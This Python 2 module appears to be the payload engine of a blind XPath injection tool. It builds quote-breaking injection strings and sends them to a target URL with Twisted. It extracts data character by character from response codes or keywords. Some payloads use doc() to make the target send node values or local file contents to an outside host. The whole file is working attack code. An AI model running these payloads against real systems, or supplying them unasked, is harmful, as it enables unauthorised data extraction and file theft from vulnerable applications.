# Payloads.py
# Makes XPath 1.0 and 2.0 payload strings
from twisted.web.iweb import IBodyProducer
from zope.interface import implements
from twisted.internet.protocol import Protocol
import string
from twisted.web.client import Agent
from twisted.internet import reactor, defer
from twisted.web.http_headers import Headers
import urllib

class Payload(object):
    def __init__(self, payload, can_lower=False, normalization=False, takes_codepoints=False):
        self.payload = string.Template(payload)

        self.can_lower = can_lower
        self.normalization = normalization
        self.takes_codepoints = takes_codepoints

    def replace(self, char, newchar):
        self.payload = string.Template(self.payload.template.replace(char, newchar))
        return self

    def Create(self, parent, wrap_base=True):
        output = self.payload
        if parent.config.xversion == "2":
            if self.takes_codepoints:
                output = string.Template(output.safe_substitute(node=parent.PAYLOADS["STRING-TO-CODEPOINTS"].GetString()))
                #print "Output (codepoints): %s"%output.template

            if parent.config.normalize_unicode and self.normalization:
                output = string.Template(output.safe_substitute(node=parent.PAYLOADS["WRAP_UNICODE"].GetString()))
                #print "Output (norm): %s"%output.template

            if parent.config.lowercase and self.can_lower:
                output = string.Template(output.safe_substitute(node=parent.PAYLOADS["WRAP_LOWERCASE"].GetString()))
                #print "Output (lower): %s"%output.template

        if not wrap_base:
            return output

        return string.Template(parent.BASE.substitute(payload=output.safe_substitute()))

    def GetString(self):
        return self.payload.template

    def __repr__(self):
        return str(self)

    def __str__(self):
        return "<Payload `%s`>"%self.payload

class WrapperPayload(Payload):
    pass


class PayloadMaker(object):

    PAYLOADS = {
        "DETECT_VERSION"       : Payload("lower-case('A')='a'"),
        "WRAP_LOWERCASE"       : WrapperPayload("lower-case($node)"),
        "WRAP_UNICODE"         : WrapperPayload("normalize-unicode($node)"),
        "STRING-TO-CODEPOINTS" : WrapperPayload("string-to-codepoints($node)"),
        "HTTP_TRANSFER"        : WrapperPayload("boolean(doc(concat('http://$host/doc?id=$id-',encode-for-uri($node))))", can_lower=True, normalization=True),
        "HTTP_TRANSFER_TEST"   : Payload("boolean(doc('http://$host/doc?id=$id-1'))"),
        "QUOTE_CHARACTER_TEST" : Payload("true()"),

        "ENTITY_INJECTION_TEST": Payload("boolean(doc('http://$host/file?t=1')/data/text()='ok')"),
        "READ_LOCAL_FILE"      : Payload("doc(concat('http://$host/file?p=', encode-for-uri('$path')))/$node", can_lower=True, normalization=True),

        "GET_NODE_CODEPOINT"   : Payload("string-to-codepoints($node)[$index]=$count", can_lower=True, normalization=True),
        "GET_CODEPOINT_LENGTH" : Payload("(string-to-codepoints($node)[$index] > $min and string-to-codepoints($node)[$index] <= $max)", can_lower=True, normalization=True),
        "GET_NODE_SUBSTRING"   : Payload("substring($node,$count,1)='$character'", can_lower=True, normalization=True),

        "NODEVALUE_LENGTH"     : Payload("string-length($node)=$count", can_lower=True, normalization=True),
        "GET_CONTENT_LENGTH"   : Payload("(string-length($node) > $min and string-length($node) <= $max)", can_lower=True, normalization=True),

        #"GET_COUNT_LENGTH_STR" : Payload("(count($node) > $min and count($node) <= $max)", can_lower=True, normalization=True),
        "GET_COUNT_LENGTH"     : Payload("(count($node) > $min and count($node) <= $max)"),
        "NODE_COUNT"           : Payload("count($node)=$count"),

        "GET_COUNT_LENGTH_U"   : Payload("(count($node) > $min and count($node) <= $max)", can_lower=True, normalization=True, takes_codepoints=True),
        "NODE_COUNT_U"         : Payload("count($node)=$count", can_lower=True, normalization=True, takes_codepoints=True),
        }


    def __init__(self, config):
        self.config = config
        self.search_space = string.ascii_letters + string.digits + " .-"
        self.agent = Agent(reactor)

        self._headers = Headers({"User-Agent":[config.user_agent], "Content-Type":["application/x-www-form-urlencoded"]})

        if config.error_keyword:
            self.BASE = string.Template("' and (if ($payload) then error() else 0) and '1' = '1".replace("'", config.quote_character))
        else:
            self.BASE = string.Template("' and $payload and '1'='1".replace("'", config.quote_character))

        for payload in self.PAYLOADS:
            self.PAYLOADS[payload] = self.PAYLOADS[payload].replace("'", config.quote_character)


    def Get(self, name, wrap_base=True):
        payload = self.PAYLOADS[name.upper()].Create(self, wrap_base=wrap_base)
        return payload.safe_substitute

    @defer.inlineCallbacks
    def RunQuery(self, payload, errorCount=0):
        content = self.config.post_argument.replace("{0}", payload)
        if self.config.http_method == "GET":
            URI = "%s?%s"%(self.config.URL,urllib.quote_plus(content))
        else:
            URI = self.config.URL

        try:
            #print self.config.post_argument.replace("{0}", payload)
            body = StringProducer(content) if self.config.http_method == "POST" else None
            response = yield self.agent.request(
                self.config.http_method,
                URI,
                self._headers,
                body
            )

            body_deferred = defer.Deferred()
            response.deliverBody(QuickAndDirtyReceiver(body_deferred))
            content = yield body_deferred

        except Exception:
            if errorCount >= 5:
                raise
            else:
                d = defer.Deferred()
                reactor.callLater(errorCount / 2, d.callback, None)
                yield d
                ret = yield self.RunQuery(payload, errorCount + 1)
                defer.returnValue(ret)


        if any([self.config.true_code, self.config.error_code, self.config.fail_code]):
            # Doing it via HTTP status codes
            if self.config.true_code:
                defer.returnValue(self.config.true_code == response.code)
            elif self.config.error_code:
                defer.returnValue(self.config.error_code == response.code)
            else:
                defer.returnValue(self.config.fail_code == response.code)
        else:

            if self.config.error_keyword:
                defer.returnValue(self.config.error_keyword in content)
            elif self.config.lookup:
                defer.returnValue(self.config.true_keyword in content)
            else:
                defer.returnValue(self.config.false_keyword in content)


    def GetSearchSpace(self):
        return self.search_space

    def SetSearchSpace(self, space):
        self.search_space = space

    @defer.inlineCallbacks
    def DetectXPathVersion(self):
        x = yield self.RunQuery(self.Get("DETECT_VERSION")())
        if x:
            self.config.xversion = "2"
            defer.returnValue("2")
        else:
            self.config.xversion = "1"
            defer.returnValue("1")

class QuickAndDirtyReceiver(Protocol):
    def __init__(self, deferred):
        self.deferred = deferred
        self.buffer = ""

    def dataReceived(self, data):
        self.buffer+=data

    def connectionLost(self, reason):
        self.deferred.callback(self.buffer)

class StringProducer(object):
    implements(IBodyProducer)

    def __init__(self, body):
        self.body = body
        self.length = len(body)

    def startProducing(self, consumer):
        consumer.write(self.body)
        return defer.succeed(None)

    def pauseProducing(self):
        pass

    def stopProducing(self):
        pass